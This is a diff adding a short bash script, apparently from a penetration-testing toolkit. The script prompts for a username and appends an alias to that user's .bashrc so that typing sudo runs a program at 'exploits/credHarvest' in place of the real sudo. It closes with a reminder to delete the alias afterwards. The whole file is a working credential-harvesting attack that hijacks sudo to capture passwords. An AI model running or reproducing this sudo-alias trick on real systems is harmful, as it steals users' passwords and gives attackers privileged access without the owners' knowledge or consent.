@@ -1,0 +1,22 @@
+#!/bin/bash
+read -p 'User: ' uservar
+path1=$(pwd)"/exploits/credHarvest"
+echo $path1
+
+# need to check current user then check if has the right to write in his current directory or any other user directory
+# if yes, then it is possible to run the script
+
+sudo_alias=`echo '' | cat /home/$uservar/.bashrc 2>/dev/null | grep "alias sudo='$path1'" | grep -v "\#"`
+if [ "$sudo_alias" ]; then
+echo "Alias for sudo found!"
+else
+echo "Alias for sudo not found!"
+
+echo "alias sudo='$path1'" >> /home/$uservar/.bashrc
+
+fi
+
+# delete last line in .bashrc > alias for sudo
+#sed -i '$d' /home/user1/.bashrc
+
+echo "IMPORTANT: Don't forget to delete the line with the alias sudo in the .bashrc"
